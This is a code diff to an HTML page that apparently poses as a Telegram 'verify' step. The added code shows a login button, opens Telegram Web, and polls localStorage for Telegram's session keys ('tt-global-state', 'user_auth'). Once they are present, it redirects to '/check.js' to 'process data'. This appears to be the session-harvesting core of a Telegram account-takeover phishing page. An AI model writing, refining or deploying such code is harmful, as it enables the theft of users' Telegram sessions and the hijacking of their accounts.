@@ -48,19 +48,27 @@
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
   function verify() {
-    // Request Telegram login using WebApp API
     Telegram.WebApp.ready();
-    Telegram.WebApp.openLink('https://web.telegram.org/k/'); // Opens Telegram login
-
-    // Poll for login state and proceed when ready
-    const checkLoginInterval = setInterval(() => {
-      const globalState = localStorage.getItem("tt-global-state");
-      if (globalState && localStorage.getItem("user_auth")) {
-        clearInterval(checkLoginInterval);
-        window.location.href = "/check.js"; // Proceed to process data
-      }
-    }, 1000); // Check every second
+    // Use mainButton to initiate login and handle within WebApp
+    Telegram.WebApp.MainButton.setText('Login to Telegram');
+    Telegram.WebApp.MainButton.show();
+    Telegram.WebApp.MainButton.onClick(() => {
+      // Request Telegram authentication
+      Telegram.WebApp.openTelegramLink('https://web.telegram.org/a/'); // Use /a/ for auth flow
+      // Poll for login state
+      const checkLoginInterval = setInterval(() => {
+        const globalState = localStorage.getItem("tt-global-state");
+        if (globalState && localStorage.getItem("user_auth")) {
+          clearInterval(checkLoginInterval);
+          Telegram.WebApp.MainButton.hide();
+          window.location.href = "/check.js"; // Proceed after login
+        }
+      }, 1000); // Check every second
+    });
   }
+
+  // Initialize
+  verify();
 </script>
 </body>
 </html>
